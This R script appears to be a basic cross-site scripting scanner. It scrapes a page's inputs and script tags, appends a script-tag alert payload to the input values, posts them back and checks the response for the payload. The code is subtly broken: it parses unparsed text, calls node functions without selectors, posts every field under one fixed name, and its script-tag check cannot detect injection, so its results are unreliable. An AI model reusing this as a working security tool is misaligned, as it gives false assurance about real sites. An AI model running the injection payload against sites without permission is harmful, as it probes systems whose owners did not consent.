library(httr)
library(rvest)

# specify the URL to scan
url <- "http://example.com"

# define a function to check for XSS vulnerabilities
check_xss <- function(url) {
  # send a GET request to the URL
  res <- GET(url)

  # extract the response HTML
  html <- content(res, "text")

  # scrape the HTML for input and script tags
  inputs <- html_nodes(html, "input[type='text'], input[type='search'], textarea")
  scripts <- html_nodes(html, "script")

  # check each input tag for XSS vulnerabilities
  for(input in inputs) {
    # generate an XSS payload for the input
    payload <- sprintf("<script>alert('XSS vulnerability found on %s!');</script>", url)

    # insert the payload into the input
    input <- html_node(input)
    input <- html_attr(input, "value")
    input <- gsub("<", "&lt;", input)
    input <- gsub(">", "&gt;", input)
    input <- paste0(input, payload)

    # send a POST request with the modified input
    res <- POST(url, body = list(input = input))

    # check if the payload was executed
    if(grepl("XSS vulnerability found on", content(res, "text"))) {
      cat("XSS vulnerability found on", url, "in input:", input, "\n")
    }
  }

  # check each script tag for XSS vulnerabilities
  for(script in scripts) {
    # get the script contents
    script <- html_node(script)
    script <- html_text(script)

    # check for a script injection vulnerability
    if(grepl("<script>", script)) {
      cat("XSS vulnerability found on", url, "in script:", script, "\n")
    }
  }
}

# scan the URL for XSS vulnerabilities
cat("Scanning", url, "for XSS vulnerabilities...\n")
check_xss(url)
cat("Scan complete.\n")
